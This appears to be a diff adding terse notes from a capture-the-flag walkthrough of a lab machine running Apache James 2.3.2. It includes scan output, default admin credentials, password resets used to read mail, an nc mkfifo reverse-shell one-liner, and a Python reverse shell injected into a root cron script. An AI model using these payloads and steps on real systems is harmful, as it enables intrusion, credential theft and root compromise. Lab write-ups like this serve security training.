@@ -1,0 +1,55 @@
+1.nmap automator
+PORT    STATE SERVICE VERSION
+22/tcp  open  ssh     OpenSSH 7.4p1 Debian 10+deb9u1 (protocol 2.0)
+| ssh-hostkey: 
+|   2048 77:00:84:f5:78:b9:c7:d3:54:cf:71:2e:0d:52:6d:8b (RSA)
+|   256 78:b8:3a:f6:60:19:06:91:f5:53:92:1d:3f:48:ed:53 (ECDSA)
+|_  256 e4:45:e9:ed:07:4d:73:69:43:5a:12:70:9d:c4:af:76 (ED25519)
+25/tcp  open  smtp    JAMES smtpd 2.3.2
+|_smtp-commands: solidstate Hello nmap.scanme.org (10.10.14.3 [10.10.14.3]),                                                                                                                                        
+80/tcp  open  http    Apache httpd 2.4.25 ((Debian))                                                                                                                                                                
+|_http-server-header: Apache/2.4.25 (Debian)                                                                                                                                                                        
+|_http-title: Home - Solid State Security                                                                                                                                                                           
+110/tcp open  pop3    JAMES pop3d 2.3.2                                                                                                                                                                             
+Service Info: Host: solidstate; OS: Linux; CPE: cpe:/o:linux:linux_kernel  
+2.Let's access port 80
+3.dirbuster on 10.10.10.51 --> list-medium-2.3
+4.searchsploit JAMES -->
+Apache James Server 2.3.2 - Remote Command Execution  
+5.we need to change the payload mentioned on the script -->
+6.Before that during full port scan I found 4555 is open, running nmap on it --> nmap -p 4555 -sV -Pn -T4 10.10.10.51
+4555/tcp open  james-admin JAMES Remote Admin 2.3.2
+7.accessing port 4555 --> telnet 10.10.10.51 4555 and tried default credentials root:root which worked.
+8.when we ran the exploit it showed that the exploit will work when someon will login, so now we have the credentials, lets make a new payload using ncn and then run the exploit
+for nc payload --> http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet
+ Payload--> rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.3 9999 >/tmp/f
+9.changing this in the script -->
+
+
+
+10. But in port 4555 we have the option to change the passwords of the users and list the users:
+reseted the passwords for all the users
+11.reading john's email :
+Subject: New Hires access
+John, 
+
+Can you please restrict mindy's access until she gets read on to the program. Also make sure that you send her a tempory password to login to her accounts.
+
+Thank you in advance.
+
+Respectfully,
+James
+12.checking mindy's account--> from that we got :
+username: mindy
+pass: P@55W0rd1!2@
+13.Let's try login into ssh, as soon as I logged in the nc worked and we got a shell as mindy
+14.got user.txt
+15.for privsec we got linpeas.sh --> https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/blob/master/linPEAS/linpeas.sh
+--> python3 -m http.server 8081
+16.In linpeas.sh i found something interesting --> /opt/tmp.py
+the file is owned by root but we have write access, let's insert a payload in it -->
+17.running pspy32 to make sure about the cron job --> https://github.com/DominicBreuker/pspy/blob/master/README.md
+every 3 minutes a cronjob is runnning of tmp.py
+echo '#!/usr/bin/env python' > tmp.py
+echo 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.3",8989));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);' >> tmp.py
+18.listensing on the specified port we got root.
